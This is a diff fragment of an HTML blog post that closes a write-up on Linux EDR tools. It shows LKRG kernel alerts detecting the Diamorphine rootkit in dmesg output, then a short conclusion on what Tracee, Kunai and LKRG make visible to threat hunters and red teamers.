 <p>Finally, we monitor the kernel ring buffer in real time to observe <em>LKRG’s</em> detection output and alerting behavior.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo dmesg -w
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839032<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: Found <span style="color:#ae81ff">1</span> fewer modules in module list <span style="color:#f92672">(</span>71<span style="color:#f92672">)</span> than in KOBJ <span style="color:#f92672">(</span>72<span style="color:#f92672">)</span>, maybe hidden module name diamorphine
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839046<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: <span style="color:#ae81ff">1</span> checksums changed unexpectedly
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Detecting <em>Diamorphine</em> Rootkit<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Detecting <em>Diamorphine</em> Rootkit
+  
+    <br><br>
+  
+</span>
 <h2 id="5-conclusion">5. Conclusion</h2>
 <p>From a threat hunter’s perspective, Linux EDR provides the kernel-level visibility needed to reconstruct attacker behavior through process, syscall, and network context. For red teamers, tools like <em>Kunai</em> and <em>Tracee</em> clearly define what tradecraft is observable and where stealth breaks down.</p>
 <p><em>Tracee</em> and <em>LKRG</em> demonstrate that even kernel rootkits and syscall tampering leave detectable integrity and behavioral signals.</p>
